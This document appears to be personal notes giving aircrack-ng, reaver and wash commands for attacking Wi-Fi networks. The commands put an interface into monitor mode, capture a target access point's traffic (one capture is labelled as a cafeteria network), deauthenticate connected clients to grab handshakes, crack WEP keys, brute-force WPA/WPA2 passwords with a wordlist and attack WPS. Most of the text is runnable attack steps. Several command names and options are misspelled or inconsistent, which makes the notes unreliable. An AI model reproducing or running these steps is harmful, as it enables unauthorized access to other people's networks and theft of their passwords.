airmon-ng start wlan0 : this will enable the monitor mode and change the name by wlan0mon

airodump-ng wlan0mon : all ap will be shown of locality
airodump-ng --bssid 5A:73:51:12:BB:2E -c 11 : capture of a specific ap packets
airodump-ng --bssid 5A:73:51:12:BB:2E -c 11 -w ~/packets/cafeteriawifi_ pcap_file : output the packet file
airodump-ng --bssid 5A:73:51:12:BB:2E -c 6 : hidden network info

we will see the client bssid that connects with this ap
then we have to do a deauthentication attack to inject packet as a spoofed client

airplay-ng -a 00:21:52:1d:2d:13 -c E8:B1:FC:97:C2:82(client bssid) --deauth 20 wlan0 :it will inject fake packet to network for handshake which will reveal the ssid(ap name)

airodump-ng --encrypt=WEP wlan0mon : filtering only wep network
airodump-ng --bssid 5A:73:51:12:BB:2E -c 1 -w wepdump

aircrack-ng wepdump.pcap : this will crack the password for wep network as maximum would be found as clear text

airplay-ng -a 00:21:52:1d:2d:13 -h E8:B1:FC:97:C2:82 --deauth 50 wlan0 : for wpa 
aircrack-ng -w /usr/share/wordlist/rockyou.txt wepdump.pcap : password bruteforcing for wpa/wpa2

for wps-enabled networks 
------------------------

once monitor mode enabled

wash -i wlan0
reaver -i wlan0man --bssid 58:56:33:B0:77:AA(target mac address)


****************airodump session should not be cancelled until a message is shown wpa handshake******

-------------------------------------------infos----------------------------------------------------

privesc: https://0xsp.com/offensive/privilege-escalation-cheatsheet/
cheatsheets: https://github.com/rmusser01/Infosec_Reference/tree/master/Draft/Cheat%20sheets%20reference%20pages%20Checklists%20-
